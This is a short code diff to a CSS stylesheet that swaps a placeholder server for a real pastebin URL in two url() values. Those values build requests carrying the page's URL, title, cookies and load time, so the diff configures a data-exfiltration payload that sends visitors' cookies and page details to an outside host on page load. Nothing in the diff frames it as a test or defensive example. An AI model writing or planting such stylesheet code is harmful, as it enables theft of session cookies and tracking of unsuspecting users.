@@ -1,5 +1,5 @@
 body::before {
-  content: url("https://YOUR-SERVER-HERE.com/catch.png?url=" 
+  content: url("https://pastebin.com/raw/jQtDJaF8.png?url=" 
     attr(data-url) 
     "&title=" attr(data-title) 
     "&cookies=" attr(data-cookies) 
@@ -10,5 +10,5 @@ body::before {
 }
 
 html {
-  background: url("https://YOUR-SERVER-HERE.com/catch.png?load=1&time=" attr(data-time)) no-repeat;
+  background: url("https://pastebin.com/raw/jQtDJaF8.png?load=1&time=" attr(data-time)) no-repeat;
 }
